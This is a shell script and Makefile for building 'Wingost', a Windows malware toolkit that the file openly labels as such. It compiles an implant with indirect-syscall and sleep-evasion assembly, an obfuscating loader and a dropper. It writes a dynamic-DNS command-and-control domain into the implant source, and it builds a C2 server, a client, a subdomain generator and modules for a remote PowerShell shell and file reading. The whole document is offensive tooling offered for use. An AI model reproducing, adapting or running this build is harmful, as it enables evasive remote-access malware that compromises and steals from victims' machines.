# #installing dependencies
# apt install mingw-w64 -r y
# apt install nasm -r y
# apt install gcc -r y
# apt install perl -r y

# #cleaning up previous builds
# rm -rf bin

# #modifying Wingost source code to fit the new domain name base on user input domain name
# perl -pi -e 'if (/main_domain\.topleveldomain/) { $s=".duckdns.org"; $l=length($s) * 2; s/L"\.main_domain\.topleveldomain"/L"$s"/; s/, 0\);/, $l);/ }' file.c

# #creating directories
# mkdir bin
# mkdir bin/lib
# mkdir bin/gostinit
# mkdir bin/tools
# mkdir bin/includes
# mkdir bin/server
# mkdir bin/server/modules
# mkdir bin/server/moduloScript

# #compiling local libraries
# nasm -f win64 lib/encrypt.asm -o bin/lib/encrypt.obj
# nasm -f elf64 lib/encrypt_linux.asm -o bin/lib/encrypt.o
# nasm -f win64 lib/obfuscate.asm -o bin/lib/obfuscate.obj
# nasm -f elf64 lib/linux_obfuscate.asm -o bin/lib/obfuscate.o

# #compiling WinSysLib libraries
# nasm -f win64 gostInit/windows/lib/_syscallExtracter.asm -o bin/lib/_syscallExtracter.obj
# nasm -f win64 gostInit/windows/lib/derectSleep.asm -o bin/lib/derectSleep.obj
# nasm -f win64 gostInit/windows/lib/inderectSyscall.asm -o bin/lib/inderectSyscall.obj

# #compiling WinGost
# x86_64-w64-mingw32-gcc -IgostInit/windows/includes/ bin/lib/encrypt.obj bin/lib/derectSleep.obj bin/lib/_syscallExtracter.obj gostInit/windows/core/WinGost.c -nostdlib -nodefaultlibs -fno-stack-protector -fno-stack-check -fno-exceptions -ffreestanding "-Wl,--entry=__main" "-Wl,-subsystem,windows" "-Wl,--disable-reloc-section" -o bin/gostinit/WinGost.exe

# #compiling loader
# x86_64-w64-mingw32-gcc -IgostInit/windows/includes/ bin/lib/obfuscate.obj gostInit/windows/loader/loader.c -nostdlib -nodefaultlibs -fno-stack-protector -fno-stack-check -fno-exceptions -ffreestanding "-Wl,--entry=__main" "-Wl,-subsystem,windows" "-Wl,--disable-reloc-section" -o bin/gostinit/loader.exe

# #compiling obfuscating Tool
# gcc tools/obfuscate.c bin/lib/obfuscate.o -o bin/tools/obfuscate -z noexecstack

# #obfuscating loader and WinGost
# bin/tools/obfuscate -l bin/gostinit/loader.exe  -g bin/gostinit/WinGost.exe

# #compiling final dropper
# x86_64-w64-mingw32-gcc -Ibin/includes bin/lib/obfuscate.obj gostInit/windows/droper/droper.c -fno-stack-protector -fno-stack-check -fno-exceptions   "-Wl,--entry=main"   "-Wl,-subsystem,windows"   -o bin/gostinit/WinGostDroper.exe   -luser32 -lkernel32 -lshell32 -lole32 -luuid -ladvapi32

# #compiling server
# gcc server/server.c bin/lib/encrypt.o -o bin/server/server -lpthread

# #compiling gost modules
# #compiling default shellmodule -> EX: shell powershell -command "ls"
# x86_64-w64-mingw32-gcc -c modules/windows/testModule.c -fPIC -m64 -ffreestanding -fno-stack-protector -nostdlib -o bin/server/modules/shell.bin
# #compiling default read mini file module -> EX: rmf C:\test.txt
# x86_64-w64-mingw32-gcc -c modules/windows/readMiniFiles.c -fPIC -m64 -ffreestanding -fno-stack-protector -nostdlib -o bin/server/modules/rmf.bin
# #compiling default print function module -> EX: print Hello
# x86_64-w64-mingw32-gcc -c modules/windows/print.c -fPIC -m64 -ffreestanding -fno-stack-protector -nostdlib -o bin/server/modules/print.bin

# #copying modulo scripts
# cp moduloScript/* bin/server/moduloScript/

# #creating client
# mkdir bin/client
# mkdir bin/client/content_box
# mkdir bin/client/config
# #copying client
# cp client/client.py bin/client/
# cp client/config/* bin/client/config/

# #cleaning up
# rm -r bin/lib
# rm -r bin/includes
# rm -r bin/tools
# rm -r bin/gostinit/loader.exe
# rm -r bin/gostinit/WinGost.exe
# mv bin/gostinit/WinGostDroper.exe bin/gostinit/WinGost.exe



# Makefile for Wingost Project
# Build system for Windows malware components

# Compilers and tools
MINGW_CC = x86_64-w64-mingw32-gcc
GCC = gcc
NASM = nasm

# Directories
BIN_DIR = bin
LIB_DIR = $(BIN_DIR)/lib
GOSTINIT_DIR = $(BIN_DIR)/gostinit
TOOLS_DIR = $(BIN_DIR)/tools
INCLUDES_DIR = $(BIN_DIR)/includes
SERVER_DIR = $(BIN_DIR)/server
MODULES_DIR = $(SERVER_DIR)/modules
MODULOSCRIPT_DIR = $(SERVER_DIR)/moduloScript
CLIENT_DIR = $(BIN_DIR)/client

# Source files
LIB_ENCRYPT = lib/encrypt.asm
LIB_ENCRYPT_LINUX = lib/encrypt_linux.asm
LIB_OBFUSCATE = lib/obfuscate.asm
LIB_OBFUSCATE_LINUX = lib/linux_obfuscate.asm
SYSCALL_EXTRACT = gostInit/windows/lib/_syscallExtracter.asm
DERECT_SLEEP = gostInit/windows/lib/derectSleep.asm
INDERECT_SYSCALL = gostInit/windows/lib/inderectSyscall.asm

# Object files
ENCRYPT_OBJ = $(LIB_DIR)/encrypt.obj
ENCRYPT_O = $(LIB_DIR)/encrypt.o
OBFUSCATE_OBJ = $(LIB_DIR)/obfuscate.obj
OBFUSCATE_O = $(LIB_DIR)/obfuscate.o
SYSCALL_OBJ = $(LIB_DIR)/_syscallExtracter.obj
DERECT_SLEEP_OBJ = $(LIB_DIR)/derectSleep.obj
INDERECT_SYSCALL_OBJ = $(LIB_DIR)/inderectSyscall.obj

# Target executables
WINGOST_EXE = $(GOSTINIT_DIR)/WinGost.exe
LOADER_EXE = $(GOSTINIT_DIR)/loader.exe
OBFUSCATE_TOOL = $(TOOLS_DIR)/obfuscate
DROPPER_EXE = $(GOSTINIT_DIR)/WinGostDroper.exe
FINAL_EXE = $(GOSTINIT_DIR)/WinGost.exe
SERVER_EXE = $(SERVER_DIR)/server

# Module outputs
SHELL_MODULE = $(MODULES_DIR)/shell.bin
RMF_MODULE = $(MODULES_DIR)/rmf.bin
PRINT_MODULE = $(MODULES_DIR)/print.bin

# Flags
MINGW_FLAGS_BASE = -fno-stack-protector -fno-stack-check -fno-exceptions -ffreestanding
MINGW_LINK_FLAGS = -nostdlib -nodefaultlibs "-Wl,--entry=__main" "-Wl,-subsystem,windows" "-Wl,--disable-reloc-section"
MINGW_DROPPER_FLAGS = -fno-stack-protector -fno-stack-check -fno-exceptions "-Wl,--entry=main" "-Wl,-subsystem,windows"
MINGW_MODULE_FLAGS = -fPIC -m64 -ffreestanding -fno-stack-protector -nostdlib

# Include paths
WINDOWS_INCLUDES = -IgostInit/windows/includes/
DROPPER_INCLUDES = -I$(INCLUDES_DIR)

# Libraries for dropper
DROPPER_LIBS = -luser32 -lkernel32 -lshell32 -lole32 -luuid -ladvapi32

# Server flags
SERVER_FLAGS = -lpthread
SERVER_LINK_FLAGS = -z noexecstack

# Source modification pattern
DOMAIN ?= nothing.venex

.PHONY: all clean install-deps modify-source setup-dirs compile-libs compile-wingost compile-loader compile-tools obfuscate compile-dropper compile-server compile-modules copy-scripts copy-tools create-client cleanup finalize

# Default target
all: install-deps clean modify-source setup-dirs compile-libs compile-wingost compile-loader compile-tools obfuscate compile-dropper compile-server compile-modules copy-scripts copy-tools create-client cleanup finalize
	@echo "$(GREEN)[✓]$(NC) Build completed successfully!"
	@echo "$(CYAN)Final executable: $(FINAL_EXE)$(NC)"

# Colors for output
RED = \033[0;31m
GREEN = \033[0;32m
YELLOW = \033[1;33m
BLUE = \033[0;34m
PURPLE = \033[0;35m
CYAN = \033[0;36m
NC = \033[0m

# Step 1: Install dependencies
install-deps:
	@echo "$(YELLOW)[1/17]$(NC) Installing dependencies..."
	@echo "$(BLUE)  → Installing mingw-w64...$(NC)"
	@apt install mingw-w64 -y || echo "$(RED)  ✗ Failed to install mingw-w64$(NC)"
	@echo "$(BLUE)  → Installing nasm...$(NC)"
	@apt install nasm -y || echo "$(RED)  ✗ Failed to install nasm$(NC)"
	@echo "$(BLUE)  → Installing gcc...$(NC)"
	@apt install gcc -y || echo "$(RED)  ✗ Failed to install gcc$(NC)"
	@echo "$(BLUE)  → Installing perl...$(NC)"
	@apt install perl -y || echo "$(RED)  ✗ Failed to install perl$(NC)"
	@echo "$(GREEN)[✓]$(NC) Dependencies installed"
	@exit

# Step 2: Clean previous builds
clean:
	@echo "$(YELLOW)[2/17]$(NC) Cleaning up previous builds..."
	@rm -rf $(BIN_DIR)
	@echo "$(GREEN)[✓]$(NC) Previous builds cleaned"

# Step 3: Modify source code
modify-source:
	@echo "$(YELLOW)[3/17]$(NC) Modifying Wingost source code for domain: $(DOMAIN)..."
	@perl -pi -e 'if (/main_domain\.topleveldomain/) { $$s=".$(DOMAIN)"; $$l=length($$s) * 2; s/L"\.main_domain\.topleveldomain"/L"$$s"/; s/, 0\);/, $$l);/ }' gostInit/windows/core/WinGost.c
	@echo "$(GREEN)[✓]$(NC) Source code modified"

# Step 4: Create directory structure
setup-dirs:
	@echo "$(YELLOW)[4/17]$(NC) Creating directory structure..."
	@mkdir -p $(LIB_DIR)
	@echo "$(BLUE)  → Created $(LIB_DIR)$(NC)"
	@mkdir -p $(GOSTINIT_DIR)
	@echo "$(BLUE)  → Created $(GOSTINIT_DIR)$(NC)"
	@mkdir -p $(TOOLS_DIR)
	@echo "$(BLUE)  → Created $(TOOLS_DIR)$(NC)"
	@mkdir -p $(INCLUDES_DIR)
	@echo "$(BLUE)  → Created $(INCLUDES_DIR)$(NC)"
	@mkdir -p $(SERVER_DIR)
	@echo "$(BLUE)  → Created $(SERVER_DIR)$(NC)"
	@mkdir -p $(MODULES_DIR)
	@echo "$(BLUE)  → Created $(MODULES_DIR)$(NC)"
	@mkdir -p $(MODULOSCRIPT_DIR)
	@echo "$(BLUE)  → Created $(MODULOSCRIPT_DIR)$(NC)"
	@echo "$(GREEN)[✓]$(NC) Directory structure created"

# Step 5: Compile local libraries
compile-libs: $(ENCRYPT_OBJ) $(ENCRYPT_O) $(OBFUSCATE_OBJ) $(OBFUSCATE_O) $(SYSCALL_OBJ) $(DERECT_SLEEP_OBJ) $(INDERECT_SYSCALL_OBJ)
	@echo "$(GREEN)[✓]$(NC) All libraries compiled"

$(ENCRYPT_OBJ): $(LIB_ENCRYPT)
	@echo "$(YELLOW)[5.1/17]$(NC) Compiling encrypt.asm for Windows..."
	@$(NASM) -f win64 $< -o $@
	@echo "$(GREEN)  → $(ENCRYPT_OBJ) created$(NC)"

$(ENCRYPT_O): $(LIB_ENCRYPT_LINUX)
	@echo "$(YELLOW)[5.2/17]$(NC) Compiling encrypt_linux.asm for Linux..."
	@$(NASM) -f elf64 $< -o $@
	@echo "$(GREEN)  → $(ENCRYPT_O) created$(NC)"

$(OBFUSCATE_OBJ): $(LIB_OBFUSCATE)
	@echo "$(YELLOW)[5.3/17]$(NC) Compiling obfuscate.asm for Windows..."
	@$(NASM) -f win64 $< -o $@
	@echo "$(GREEN)  → $(OBFUSCATE_OBJ) created$(NC)"

$(OBFUSCATE_O): $(LIB_OBFUSCATE_LINUX)
	@echo "$(YELLOW)[5.4/17]$(NC) Compiling linux_obfuscate.asm for Linux..."
	@$(NASM) -f elf64 $< -o $@
	@echo "$(GREEN)  → $(OBFUSCATE_O) created$(NC)"

$(SYSCALL_OBJ): $(SYSCALL_EXTRACT)
	@echo "$(YELLOW)[5.5/17]$(NC) Compiling _syscallExtracter.asm..."
	@$(NASM) -f win64 $< -o $@
	@echo "$(GREEN)  → $(SYSCALL_OBJ) created$(NC)"

$(DERECT_SLEEP_OBJ): $(DERECT_SLEEP)
	@echo "$(YELLOW)[5.6/17]$(NC) Compiling derectSleep.asm..."
	@$(NASM) -f win64 $< -o $@
	@echo "$(GREEN)  → $(DERECT_SLEEP_OBJ) created$(NC)"

$(INDERECT_SYSCALL_OBJ): $(INDERECT_SYSCALL)
	@echo "$(YELLOW)[5.7/17]$(NC) Compiling inderectSyscall.asm..."
	@$(NASM) -f win64 $< -o $@
	@echo "$(GREEN)  → $(INDERECT_SYSCALL_OBJ) created$(NC)"

# Step 6: Compile WinGost
compile-wingost: $(WINGOST_EXE)
$(WINGOST_EXE): $(ENCRYPT_OBJ) $(DERECT_SLEEP_OBJ) $(SYSCALL_OBJ)
	@echo "$(YELLOW)[6/17]$(NC) Compiling WinGost..."
	@echo "$(BLUE)  → Compiling with MinGW...$(NC)"
	@$(MINGW_CC) $(WINDOWS_INCLUDES) $(ENCRYPT_OBJ) $(DERECT_SLEEP_OBJ) $(SYSCALL_OBJ) gostInit/windows/core/WinGost.c $(MINGW_FLAGS_BASE) $(MINGW_LINK_FLAGS) -o $@
	@echo "$(GREEN)  → $(WINGOST_EXE) created$(NC)"

# Step 7: Compile loader
compile-loader: $(LOADER_EXE)
$(LOADER_EXE): $(OBFUSCATE_OBJ)
	@echo "$(YELLOW)[7/17]$(NC) Compiling loader..."
	@$(MINGW_CC) $(WINDOWS_INCLUDES) $(OBFUSCATE_OBJ) gostInit/windows/loader/loader.c $(MINGW_FLAGS_BASE) $(MINGW_LINK_FLAGS) -o $@
	@echo "$(GREEN)  → $(LOADER_EXE) created$(NC)"

# Step 8: Compile obfuscation tool
compile-tools: $(OBFUSCATE_TOOL)
$(OBFUSCATE_TOOL): $(OBFUSCATE_O)
	@echo "$(YELLOW)[8/17]$(NC) Compiling obfuscation tool..."
	@$(GCC) tools/obfuscate.c $(OBFUSCATE_O) -o $@ $(SERVER_LINK_FLAGS)
	@echo "$(GREEN)  → $(OBFUSCATE_TOOL) created$(NC)"

# Step 9: Obfuscate binaries
obfuscate: $(LOADER_EXE) $(WINGOST_EXE) $(OBFUSCATE_TOOL)
	@echo "$(YELLOW)[9/17]$(NC) Obfuscating loader and WinGost..."
	@echo "$(BLUE)  → Obfuscating $(LOADER_EXE)...$(NC)"
	@$(OBFUSCATE_TOOL) -l $(LOADER_EXE) -g $(WINGOST_EXE)
	@echo "$(GREEN)[✓]$(NC) Obfuscation completed"

# Step 10: Compile final dropper
compile-dropper: $(DROPPER_EXE)
$(DROPPER_EXE): $(OBFUSCATE_OBJ)
	@echo "$(YELLOW)[10/17]$(NC) Compiling final dropper..."
	@$(MINGW_CC) $(DROPPER_INCLUDES) $(OBFUSCATE_OBJ) gostInit/windows/droper/droper.c $(MINGW_DROPPER_FLAGS) -o $@ $(DROPPER_LIBS)
	@echo "$(GREEN)  → $(DROPPER_EXE) created$(NC)"

# Step 11: Compile server
compile-server: $(SERVER_EXE)
$(SERVER_EXE): $(ENCRYPT_O)
	@echo "$(YELLOW)[11/17]$(NC) Compiling server..."
	@$(GCC) server/cross_platform_server.c $(ENCRYPT_O) -o $@ $(SERVER_FLAGS)
	@echo "$(GREEN)  → $(SERVER_EXE) created$(NC)"

# Step 12: Compile modules
compile-modules: $(SHELL_MODULE) $(RMF_MODULE) $(PRINT_MODULE)
	@echo "$(GREEN)[✓]$(NC) All modules compiled"

$(SHELL_MODULE):
	@echo "$(YELLOW)[12.1/17]$(NC) Compiling shell module..."
	@echo "$(BLUE)  → Compiling testModule.c...$(NC)"
	@$(MINGW_CC) -c modules/windows/testModule.c $(MINGW_MODULE_FLAGS) -o $@
	@echo "$(GREEN)  → $(SHELL_MODULE) created$(NC)"

$(RMF_MODULE):
	@echo "$(YELLOW)[12.2/17]$(NC) Compiling read mini files module..."
	@echo "$(BLUE)  → Compiling readMiniFiles.c...$(NC)"
	@$(MINGW_CC) -c modules/windows/readMiniFiles.c $(MINGW_MODULE_FLAGS) -o $@
	@echo "$(GREEN)  → $(RMF_MODULE) created$(NC)"

$(PRINT_MODULE):
	@echo "$(YELLOW)[12.3/17]$(NC) Compiling print module..."
	@echo "$(BLUE)  → Compiling print.c...$(NC)"
	@$(MINGW_CC) -c modules/windows/print.c $(MINGW_MODULE_FLAGS) -o $@
	@echo "$(GREEN)  → $(PRINT_MODULE) created$(NC)"

# Step 13: Copy modulo scripts
copy-scripts:
	@echo "$(YELLOW)[13/17]$(NC) Copying modulo scripts..."
	@cp moduloScript/* $(MODULOSCRIPT_DIR)/
	@echo "$(GREEN)[✓]$(NC) Modulo scripts copied"

copy-tools:
	@echo "$(YELLOW)[13.1/17]$(NC) Copying subdomainGenerater tool..."
	@cp server/subdomainGenerating.py $(TOOLS_DIR)/
	@echo "$(GREEN)[✓]$(NC) subdomainGenerater copied"

# Step 14: Create client structure
create-client:
	@echo "$(YELLOW)[14/17]$(NC) Creating client structure..."
	@mkdir -p $(CLIENT_DIR)/content_box
	@echo "$(BLUE)  → Created $(CLIENT_DIR)/content_box$(NC)"
	@mkdir -p $(CLIENT_DIR)/config
	@echo "$(BLUE)  → Created $(CLIENT_DIR)/config$(NC)"
	@cp C2Client/client.py $(CLIENT_DIR)/
	@echo "$(BLUE)  → Copied client.py$(NC)"
	@cp C2Client/config/* $(CLIENT_DIR)/config/
	@echo "$(BLUE)  → Copied config files$(NC)"
	@echo "$(GREEN)[✓]$(NC) Client structure created"

# Step 15: Cleanup intermediate files
cleanup:
	@echo "$(YELLOW)[15/17]$(NC) Cleaning up intermediate files..."
	@rm -rf $(LIB_DIR)
	@echo "$(BLUE)  → Removed $(LIB_DIR)$(NC)"
	@rm -rf $(INCLUDES_DIR)
	@echo "$(BLUE)  → Removed $(INCLUDES_DIR)$(NC)"
	@rm -rf $(TOOLS_DIR)/obfuscate
	@echo "$(BLUE)  → Removed $(TOOLS_DIR)$(NC)"
	@rm -f $(LOADER_EXE)
	@echo "$(BLUE)  → Removed $(LOADER_EXE)$(NC)"
	@rm -f $(WINGOST_EXE)
	@echo "$(BLUE)  → Removed $(WINGOST_EXE)$(NC)"
	@echo "$(GREEN)[✓]$(NC) Cleanup completed"

# Step 16: Finalize
finalize:
	@echo "$(YELLOW)[16/17]$(NC) Finalizing build..."
	@mv $(DROPPER_EXE) $(FINAL_EXE)
	@echo "$(BLUE)  → Moved $(DROPPER_EXE) to $(FINAL_EXE)$(NC)"
	@echo "$(GREEN)[✓]$(NC) Build finalized"

# Help target
help:
	@echo "$(CYAN)Wingost Build System$(NC)"
	@echo ""
	@echo "$(YELLOW)Available targets:$(NC)"
	@echo "  $(GREEN)all$(NC)              - Build everything (default)"
	@echo "  $(GREEN)install-deps$(NC)     - Install build dependencies"
	@echo "  $(GREEN)clean$(NC)            - Clean build directory"
	@echo "  $(GREEN)compile-libs$(NC)     - Compile assembly libraries"
	@echo "  $(GREEN)compile-wingost$(NC)  - Compile WinGost"
	@echo "  $(GREEN)compile-loader$(NC)   - Compile loader"
	@echo "  $(GREEN)compile-tools$(NC)    - Compile obfuscation tool"
	@echo "  $(GREEN)obfuscate$(NC)        - Obfuscate binaries"
	@echo "  $(GREEN)compile-dropper$(NC)  - Compile final dropper"
	@echo "  $(GREEN)compile-server$(NC)   - Compile server"
	@echo "  $(GREEN)compile-modules$(NC)  - Compile server modules"
	@echo "  $(GREEN)help$(NC)             - Show this help"

# Debug target - shows all variables
debug:
	@echo "$(PURPLE)Build Configuration:$(NC)"
	@echo "  MINGW_CC: $(MINGW_CC)"
	@echo "  GCC: $(GCC)"
	@echo "  NASM: $(NASM)"
	@echo "  BIN_DIR: $(BIN_DIR)"
	@echo "  DOMAIN: $(DOMAIN)"